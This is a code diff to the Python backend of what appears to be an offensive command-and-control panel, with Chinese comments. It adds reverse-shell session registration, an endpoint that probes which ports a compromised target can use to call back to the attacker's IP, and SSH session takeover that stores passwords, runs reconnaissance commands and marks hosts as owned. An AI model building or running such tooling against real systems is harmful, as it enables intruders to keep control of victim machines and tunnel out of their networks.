@@ -15,7 +15,7 @@ from sqlalchemy.orm import Session as DBSession
 from ..config import DEFAULT_PROJECT_ID
 from ..db import get_attack, get_db, get_session_factory, now
 from ..models import Host, ReverseListener, Shell
-from ..schemas import ShellIn, ShellOut
+from ..schemas import ShellIn, ShellOut, SshIn
 from ..schemas.common import rid
 from ..service import add_event
 from ..service import filestage as stage_svc
@@ -23,6 +23,7 @@ from ..service import tty as tty_svc
 from ..service.probe import run_probes
 from ..session import SessionError, get_session
 from ..session.reverse import SERVICE as REVERSE_SERVICE, detect_platform
+from ..session.ssh import SshSession
 from ..ws import manager
 from .deps import get_project
 
@@ -219,6 +220,12 @@ def test_shell(shell_id: str, db: DBSession = Depends(get_db)):
     else:
         add_event(db, project_id, "shell", f"Shell 连通性测试失败：{t.error}", host_id=s.host_id)
     db.commit()
+    # SSH 会话为一次性连接，用完即关，避免占用对端连接数
+    if getattr(s, "kind", "") == "ssh":
+        try:
+            sess.close()
+        except Exception:
+            pass
     return ShellOut.of(s)
 
 
@@ -284,10 +291,22 @@ def exec_command(shell_id: str, form: ExecIn, db: DBSession = Depends(get_db)):
         if getattr(s, "kind", "") == "reverse":
             s.alive = False
             db.commit()
+        # SSH 会话：执行异常时也要关连接，避免泄漏
+        if getattr(s, "kind", "") == "ssh":
+            try:
+                sess.close()
+            except Exception:
+                pass
         return JSONResponse({"ok": False, "output": "", "error": str(e), "ms": 0,
                              "timedOut": False, "stage": "exec"})
     s.last_beat_at = now()
     db.commit()
+    # SSH 会话为一次性连接，用完即关，避免占用对端连接数
+    if getattr(s, "kind", "") == "ssh":
+        try:
+            sess.close()
+        except Exception:
+            pass
     return {
         "ok": res.ok, "output": res.output, "error": res.error,
         "ms": res.ms, "timedOut": res.timed_out,
@@ -609,6 +628,60 @@ def shell_probe(shell_id: str, form: ProbeIn | None = None, db: DBSession = Depe
     return out
 
 
+class CallbackMatrixIn(BaseModel):
+    """回连端口矩阵：attackIp 留空时取全局设置的攻击机 IP（所有回连命令的唯一来源）。"""
+
+    attackIp: str = ""
+    ports: list[int] = []
+    timeout: float = 8.0
+
+
+@router.post("/shells/{shell_id}/probe/callback")
+def shell_probe_callback(shell_id: str, form: CallbackMatrixIn | None = None,
+                         db: DBSession = Depends(get_db)):
+    """【A4】对攻击机逐端口实测出站可达性 → 直接回答「哪个端口能回连」。
+
+    四探针回答的是"能不能上公网"；这里回答的是"我这条回连路径到底通不通"，
+    结论中的端口可直接填进隧道服务端监听端口。
+    """
+    from ..db import get_attack
+    from ..service.probe import run_callback_matrix
+
+    s = _get_shell(db, shell_id)
+    host = db.get(Host, s.host_id)
+    attack_ip = (form.attackIp if form else "") or ""
+    if not attack_ip:
+        try:
+            attack_ip = str(get_attack(db, s.project_id).get("ip") or "")
+        except Exception:
+            attack_ip = ""
+    try:
+        sess = _open_session(db, s)
+        _ensure_reachable(sess)
+    except SessionError as e:
+        return JSONResponse({"ok": False, "stage": "reachable", "error": str(e),
+                             "verdict": "", "recommend": "", "alt": "",
+                             "reason": f"探测未执行：{e}", "probes": []})
+
+    report = run_callback_matrix(
+        sess, attack_ip=attack_ip, host_id=s.host_id,
+        ports=(form.ports if form and form.ports else None),
+        per_timeout=float(form.timeout if form else 8.0) or 8.0,
+    )
+    for p in report.probes:
+        manager.push("probe.result", hostId=s.host_id, probe=p.key,
+                     ok=(p.state == "ok"), ms=p.ms, evidence=p.evidence, cmd=p.cmd)
+    add_event(db, s.project_id, "proxy", f"回连端口矩阵：{report.verdict}",
+              host_id=s.host_id,
+              detail=f"推荐 {report.recommend} · 对端 {attack_ip} · 证据 "
+                     + "; ".join(f"{p.key}={p.state}" for p in report.probes))
+    db.commit()
+    out = report.to_dict()
+    out["ok"] = True
+    out["attackIp"] = attack_ip
+    return out
+
+
 # ---------------------------------------------------------------------------
 # 反弹 Shell 通道（会话层 reverse 驱动）：监听 → 靶机回连 → 登记会话
 # ---------------------------------------------------------------------------
@@ -626,11 +699,26 @@ class ReverseListenIn(BaseModel):
 
 
 class ReverseRegisterIn(BaseModel):
+    """把已回连通道登记为会话。
+
+    ⚠️ 修正：hostId **不再必填**。原先无 WebShell 前置（纯 RCE → 直接反弹）时
+    前端传 hostId='' → 后端 `db.get(Host,'')` 为 None → 抛 404「主机不存在」，
+    而前端 api.js 把 404 抹成「HTTP 404 /api/shells/reverse/register」，看起来
+    像接口缺失。现在改为：hostId → 同 IP 既有主机 → hostIp → **回连对端 IP 自动建主机**。
+    """
+
     projectId: str = ""
     listenerId: str
-    hostId: str
+    hostId: str = ""
+    hostIp: str = ""
     type: str = "反弹 Shell（/dev/tcp）"
     autoCollect: bool = True
+
+
+def _seg_of_ip(ip: str) -> str:
+    """由 IP 推 /24 网段（避免与 api.hosts 相互 import）。"""
+    parts = (ip or "").split(".")
+    return ".".join(parts[:3]) + ".0/24" if len(parts) == 4 else ""
 
 
 @router.post("/shells/reverse/listen")
@@ -875,16 +963,56 @@ def shell_raw_mode(shell_id: str, form: RawModeIn, db: DBSession = Depends(get_d
 
 @router.post("/shells/reverse/register")
 def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
-    """把已回连的通道登记为面板会话（kind=reverse），后续 exec/文件/固化全部复用会话层。"""
+    """把已回连的通道登记为面板会话（kind=reverse），后续 exec/文件/固化全部复用会话层。
+
+    主机解析顺序（任一命中即用，避免"必须先有 WebShell 才能登记反弹"的隐性前置）：
+    1. 显式 hostId（须属于本项目）
+    2. 回连对端 IP 命中的既有主机
+    3. 显式 hostIp 命中的既有主机
+    4. 用回连对端 IP 或 hostIp **自动创建**主机（发现方式记为「反弹回连」）
+    """
     project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)
-    host = db.get(Host, form.hostId)
-    if not host or host.project_id != project.id:
-        raise HTTPException(404, f"主机不存在: {form.hostId}")
+
     try:
         lis = REVERSE_SERVICE.get(form.listenerId)
-        if not lis.connected.is_set():
-            return JSONResponse({"ok": False, "stage": "callback",
-                                 "error": "尚无回连（请先在靶机执行 /dev/tcp 反弹命令）"})
+    except SessionError as e:
+        return JSONResponse({"ok": False, "stage": "listener", "error": str(e)})
+    if not lis.connected.is_set():
+        return JSONResponse({"ok": False, "stage": "callback",
+                             "error": "尚无回连（请先在靶机执行反弹命令，或确认监听 bind 地址正确）"})
+
+    peer = getattr(lis, "peer", None) or ("?", 0)
+    peer_ip = str(peer[0] or "")
+
+    host = None
+    if form.hostId:
+        cand = db.get(Host, form.hostId)
+        if cand is not None and cand.project_id == project.id:
+            host = cand
+    for ip in (peer_ip, form.hostIp):
+        if host is not None or not ip or ip == "?":
+            continue
+        host = db.query(Host).filter(Host.project_id == project.id, Host.ip == ip).first()
+        if host is None:
+            host = Host(
+                id=rid("h"), project_id=project.id, ip=ip, hostname="", os="",
+                layer="L1", segment=_seg_of_ip(ip), privilege="", owned=False,
+                ports=[], services=[], note="反弹 Shell 回连自动登记",
+                discovery="反弹回连",
+            )
+            db.add(host)
+            db.flush()
+            add_event(db, project.id, "host", f"反弹回连自动登记主机 {ip}", host_id=host.id,
+                      detail="由反弹会话登记自动创建（无需预先手动登记主机）")
+    if host is None:
+        return JSONResponse({
+            "ok": False, "stage": "host",
+            "error": "无法确定会话所属主机：回连对端 IP 未知。请在下面的下拉里手动指定主机，"
+                     "或先用「添加 Shell」登记该主机。",
+            "peer": list(peer),
+        })
+
+    try:
         ch = lis.take()
     except SessionError as e:
         return JSONResponse({"ok": False, "stage": "channel", "error": str(e)})
@@ -944,6 +1072,107 @@ def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
     out = ShellOut.of(s)
     manager.push("shell.created", shell=out.model_dump())
     return {"ok": True, "shell": out.model_dump(), "listener": lis.to_dict()}
+
+
+# ---------------------------------------------------------------------------
+# SSH 会话纳管（A7）：直接以 SSH 协议纳管主机，比 HTTP 马更稳
+# ---------------------------------------------------------------------------
+
+@router.post("/shells/ssh")
+def ssh_register(form: SshIn, db: DBSession = Depends(get_db)):
+    """把一台主机以 SSH 会话纳管（kind=ssh）。
+
+    流程：1) 真实连接测试（connect + test）；2) 成功才落库 Shell 与（必要时）
+    自动创建主机；失败返回真实错误且**不**创建记录。
+
+    主机解析顺序（任一命中即用）：
+    1. 显式 hostId（须属于本项目）
+    2. 同 IP 既有主机（autoHost 时）
+    3. 用 form.host 自动创建主机（发现方式记为「SSH 会话」）
+    """
+    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)
+
+    # 1) 真实连接测试（失败如实返回，不落库）
+    sess = SshSession(
+        host=form.host, port=form.port, username=form.username, password=form.password,
+        key_path=form.keyPath, key_passphrase=form.keyPassphrase,
+        platform=form.platform or "linux",
+    )
+    try:
+        sess.connect()
+        t = sess.test()
+    except SessionError as e:
+        return JSONResponse({"ok": False, "stage": "connect", "error": str(e)})
+    if not t.ok:
+        sess.close()
+        return JSONResponse({"ok": False, "stage": "test",
+                              "error": t.error or "SSH 连接测试无回显"})
+
+    # 平台与主机名取连接后真实探测结果
+    platform = sess.platform or "linux"
+    s_hostname = sess._hostname
+
+    # 2) 主机解析：hostId → 同 IP 既有主机 → 自动创建
+    host = None
+    if form.hostId:
+        cand = db.get(Host, form.hostId)
+        if cand is not None and cand.project_id == project.id:
+            host = cand
+    if host is None and form.autoHost:
+        host = db.query(Host).filter(
+            Host.project_id == project.id, Host.ip == form.host
+        ).first()
+        if host is None:
+            host = Host(
+                id=rid("h"), project_id=project.id, ip=form.host, hostname=s_hostname,
+                os="", layer="L1", segment=_seg_of_ip(form.host), privilege="",
+                owned=False, ports=[], services=[], note="SSH 会话自动登记",
+                discovery="SSH 会话",
+            )
+            db.add(host)
+            db.flush()
+            add_event(db, project.id, "host", f"SSH 会话自动登记主机 {form.host}",
+                      host_id=host.id,
+                      detail="由 SSH 会话纳管自动创建（无需预先手动登记主机）")
+    if host is None:
+        sess.close()
+        return JSONResponse({
+            "ok": False, "stage": "host",
+            "error": "无法确定会话所属主机：请先指定 hostId 或允许自动创建主机（autoHost）。",
+        })
+
+    # 3) 落库 Shell(kind=ssh)；url 约定 ssh://user@host:port，pwd 存密码
+    s = Shell(
+        id=rid("s"), project_id=project.id, host_id=host.id, type="SSH 会话",
+        kind="ssh", url=f"ssh://{form.username}@{form.host}:{form.port}",
+        pwd=form.password, encoder="none", alive=True, latency=t.ms,
+        last_beat_at=now(), hostname=s_hostname, privilege=host.privilege,
+        stable=False, platform=platform,
+    )
+    db.add(s)
+    db.flush()
+
+    collect_detail = ""
+    if form.autoCollect:
+        probe = ("whoami; ver; hostname" if platform == "windows"
+                 else "id; uname -a; hostname")
+        info = sess.exec(probe)
+        collect_detail = _collect_host_info(db, host, info.output)
+    sess.close()
+
+    if s.alive:
+        host.owned = True
+
+    add_event(db, project.id, "shell",
+              f"SSH 会话纳管成功：{form.username}@{form.host}:{form.port}",
+              host_id=host.id,
+              detail=f"协议 SSH · 延迟 {s.latency}ms · 平台 {platform}"
+                     + (f" · {collect_detail}" if collect_detail else ""))
+    db.commit()
+    out = ShellOut.of(s)
+    manager.push("shell.created", shell=out.model_dump())
+    return {"ok": True, "shell": out.model_dump(),
+            "hostname": s_hostname, "platform": platform}
 
 
 # ---------------------------------------------------------------------------
